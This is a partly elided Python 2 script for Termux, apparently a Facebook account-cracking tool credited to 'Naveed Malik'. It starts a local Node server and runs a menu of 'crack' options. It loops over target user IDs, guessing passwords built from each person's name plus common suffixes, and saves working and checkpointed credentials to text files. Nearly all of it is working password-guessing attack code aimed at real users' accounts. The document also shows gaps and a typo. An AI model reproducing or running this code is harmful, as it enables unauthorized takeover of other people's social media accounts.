...
__author__ = 'NAVEED MALIK'
__copyright = 'All rights reserved . Copyright  NAVEED MALIK'
...
if not os.path.isfile('/data/data/com.termux/files/home/jjjjj/...../node_modules/bytes/index.js'):
    ...
    if os.path.isfile('/data/data/com.termux/files/home/jjjjj/...../node_modules/bytes/index.js'):
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd jjjjj && node index.js &')
        os.system('clear')
    ...
    def logging():
        titik = [
         '.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;32m[\xe2\x9c\x93] Logging In\x1b[0;97m ' + o,
            sys.stdout.flush()
            time.sleep(1)
    ...
    def saving():
        titik = [
         '.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;32m[\xe2\x9c\x93] Saving Token\x1b[0;97m ' + o,
            sys.stdout.flush()
            time.sleep(1)
    ...
    def updateing():
        titik = [
         '.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;32m[\xe2\x9c\x93] Getting Updates\x1b[0;97m ' + o,
            sys.stdout.flush()
            time.sleep(1)
    ...
    def logout():
        titik = [
         '.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;32m[\xe2\x9c\x93] Logging Out\x1b[0;97m ' + o,
            sys.stdout.flush()
            time.sleep(1)
    ...
    def download():
        titik = [
         '.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;32m[\xe2\x9c\x93] Downloading\x1b[0;97m ' + o,
            sys.stdout.flush()
            time.sleep(1)
...
if not os.path.isfile('/data/data/com.termux/files/home/jjjjj/node_modules/bytes/index.js'):
    ...
    os.system('cd jjjjj  && node index.js &')
    os.system('clear')
    os.system('xdg-open https://wa.me/+923226906314')
    time.sleep(10)
else:
    if os.path.isfile('/data/data/com.termux/files/home/jjjjj/node_modules/bytes/index.js'):
        os.system('fuser -k 5000/tcp &')
        ...
        os.system('cd jjjjj && node index.js &')
        os.system('clear')
        print '\x1b[1;32mPlease Select Chrome Browser To Continue( then come back to termux )\x1b[0;97m'
...
##     ## ##     ## ######## #### ##    ## 
\033[1;97m--------------------------------------------------
\033[1;93m(!)\033[1;97m Author   : NAVEED MALIK
\033[1;93m(!)\033[1;97m WhatsApp   : 03226906314
\033[1;93m(!)\033[1;97m Facebook         : Naveed Malik
\033[1;97m--------------------------------------------------
"""
...
def log_menu_s():
    s = raw_input(' \x1b[1;94m\xe2\x95\xb0\xe2\x94\x80NAVEED\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def menu():
    ...
    print ' ------------------------------------------ '
    print '\x1b[1;92m[1] Crack with Auto password 15'
    ...
    print '\x1b[1;92m[0] Delete trash files'
    menu_s()


def menu_s():
    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80NAVEED\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80NAVEED\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;92m{MALIK NAVEED}\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + '123456'
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[NAVEED-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/NAVEED_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[NAVEED-CP] ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[NAVEED-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/NAVEED_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[NAVEED-CP] ' + uid + ' | ' + pass2
                    cp = open('NAVEED_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[NAVEED-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/NAVEED_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[NAVEED-CP] ' + uid + ' | ' + pass3
                        cp = open('NAVEED_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[NAVEED-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/NAVEED_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[NAVEED-CP] ' + uid + ' | ' + pass4
                            cp = open('NAVEED_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[NAVEED-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/NAVEED_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[NAVEED-CP] ' + uid + ' | ' + pass5
                                cp = open('NAVEED_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[NAVEED-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/NAVEED_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[NAVEED-CP] ' + uid + ' | ' + pass6
                                    cp = open('NAVEED_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[NAVEED-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/NAVEED_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;31;1m[NAVEED-CP] ' + uid + ' | ' + pass7
                                        cp = open('NAVEED_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[NAVEED-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/NAVEED_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            ...
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[NAVEED-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/NAVEED_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;31;1m[NAVEED-CP] ' + uid + ' | ' + pass9
                                                cp = open('NAVEED_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                ...
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[NAVEED-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/NAVEED_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;31;1m[NAVEED-CP] ' + uid + ' | ' + pass10
                                                    cp = open('NAVEED_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                ...
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[NAVEED-OK] \x1b[1;32m' + uid + ' | ' + pass11 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/NAVEED_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass11 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass11)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;31;1m[NAVEED-CP] ' + uid + ' | ' + pass11
                                                    cp = open('NAVEED_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass11 + '\n')
                                                    cp.close()
                                                ...
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[NAVEED-OK] \x1b[1;32m' + uid + ' | ' + pass14 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/NAVEED_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass14 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass14)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;31;1m[NAVEED-CP] ' + uid + ' | ' + pass14
                                                    cp = open('NAVEED_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass14 + '\n')
                                                    cp.close()
                                                ...
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[NAVEED-OK] \x1b[1;32m' + uid + ' | ' + pass15 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/NAVEED_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass15 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass15)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;31;1m[NAVEED-CP] ' + uid + ' | ' + pass15
                                                    cp = open('NAVEED_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass15 + '\n')
                                                    cp.close()
...
def c_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94m{MALIK NAVEED}\x1b[1;91m'
    print 47 * '-'
                                ...
                                if 'loc' in q:
                                    ...
                                    if 'loc' in q:
                                        ...
                                        if 'loc' in q:
                                            ...
                                            print '\x1b[1;31;1m[NAVEED-CP] ' + uid + ' | ' + pass8
                                            cp = open('NAVEED_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
